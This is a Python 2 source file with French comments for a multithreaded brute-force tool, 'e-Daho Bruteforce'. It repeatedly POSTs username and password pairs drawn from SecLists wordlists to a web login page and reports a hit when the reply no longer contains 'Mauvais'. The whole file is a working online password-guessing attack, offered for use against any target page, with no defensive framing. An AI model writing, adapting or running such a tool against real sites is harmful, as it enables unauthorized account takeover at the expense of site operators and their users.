#! /usr/bin/env python
# -*-coding: utf-8-*-

import httplib, urllib, re, sys, getopt
from urlparse import urlparse
from threading import Thread

# ce script permet de faire du bruteforce sur une page d'authentification sur internet

# variables globales
target_page = ''
usernames_file = '/usr/share/wordlist/SecLists-master/Usernames/top_shortlist.txt'
passwords_file = '/usr/share/wordlist/SecLists-master/Passwords/10_million_password_list_top_10000.txt'
n_thread = 1


#==================================================================================================

def usage():
	# fonction affichant l'utilisation du programme

	print "e-Daho Bruteforce\n"
	print "Usage : bruteforce_auth.py -t target_page"
	print "-u --usernames     - fichier d'identifiants"
	print "-p --passwords     - fichier de mots de passe"
	print "-n --nombre        - nombre de threads à créer"
	print "\n"
	print "Exemples : "
	print "bruteforce_auth.py -t www.monsite/authentification.fr"
	print "bruteforce_auth.py -t www.monsite/authentification.fr -u /home/user/wordlist/usernames.txt"
	print "bruteforce_auth.py -t www.monsite/authentification.fr -p /home/user/wordlist/passwords.txt"
	print "bruteforce_auth.py -t www.monsite/authentification.fr -n 10"
	sys.exit(0)


#==================================================================================================


def main():
	# fonction exécutant le programme en fonction des paramêtres d'entrée

	global target_page
	global usernames_file
	global passwords_file
	global n_thread

	if not len(sys.argv[1:]):
		usage()

	# on lit les options entrées en ligne de commande
	try:
		opts, args = getopt.getopt(sys.argv[1:], "ht:u:p:n:",
			["help", "target", "usernames", "passwords", "nombre"])
	except getopt.GetoptError as e:
		print str(e)
		usage()

	for o,a in opts:
		if o in ("-h", "--help"):
			usage()
		elif o in ("-t", "--target"):
			target_page = a
		elif o in ("-u", "--usernames"):
			usernames_file = a
		elif o in ("-p", "--password"):
			passwords_file = a
		elif o in ("-n", "--nombre"):
			n_thread = int(a)
		else:
			assert False, "Option non gérée"

	# si on a défini une page ciblée, on lance les threads
	if len(target_page) and n_thread > 0 and usernames_file and passwords_file:

		# on charge les wordlists des usernames et des mots de passe
		usernames = list(open(usernames_file, 'r'))
		passwords = list(open(passwords_file, 'r'))

		# on récupère le nom de domaine et la page concernée
		domaine = urlparse("//%s" %target_page).netloc
		page = urlparse("//%s" %target_page).path

		# on divise la liste de usernames en n (= n_thread) parties égales (à plus ou moins un username près)
		usernames_thread = [usernames[i::n_thread] for i in xrange(n_thread)] # (merci stack overflow)

		# on crée les threads
		threads = []
		for i in range(n_thread):
			threads.append(Bruteforce(usernames_thread[i], passwords, domaine, page))

		# on lance les threads
		for thread in threads:
			thread.start()

		# on attend que les threads se terminent
		for threads in threads:
			thread.join()

	# sinon on retourne les instructions d'utilisation
	else:
		usage()

		

#==================================================================================================


class Bruteforce(Thread):
	# thread chargé de tester toutes les combinaisons possibles entre les usernames dont il a la charge et les mots de passe


	def __init__(self, usernames_thread, passwords, domaine, page):
		# constructeur

		Thread.__init__(self)
		self.usernames_thread = usernames_thread
		self.passwords = passwords
		self.domaine = domaine
		self.page = page


	def run(self):
		# instructions à exécuter par le thread

		# booléen permettant de stopper le thread en cas de succès
		find = False

		# on crée les headers
		headers = { "Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain" }

		# on ouvre une connexion avec le site désiré
		conn = httplib.HTTPConnection(self.domaine, 80)

		# pour chaque identifiants
		for username in self.usernames_thread:

			# et pour chaque mot de passe
			for password in self.passwords:

				# on encode les informations de la requête post
				params = urllib.urlencode({'log': username.rstrip(), 'mot_de_passe' : password.rstrip()})

				# on affiche le couple pseudo/password qu'on essaie
				print "%s  %s" %(username.rstrip(),password.rstrip())

				# on envoie notre requete POST sur la page souhaitée
				conn.request("POST", self.page, params, headers)

				# on récupère le corps de la réponse du serveur
				texte = conn.getresponse().read()

				# si la réponse n'est pas "mauvais mot de passe" et qu'on ne demande pas de password
				if "Mauvais" not in texte:

					# on renvoie les identifiants associés
					print "=============================="
					print "  Authentification réussie !  "
					print "      %s  %s     " %(username, password.rstrip())
					print "=============================="

					# on renvoie True
					find = True

					# on sort de la boucle des passwords
					break

			# si on a trouvé les identifiants, on arrête la boucle sur les pseudo
			if find:
				break

		# on ferme la connexion
		conn.close()



if __name__ == "__main__":
	main()
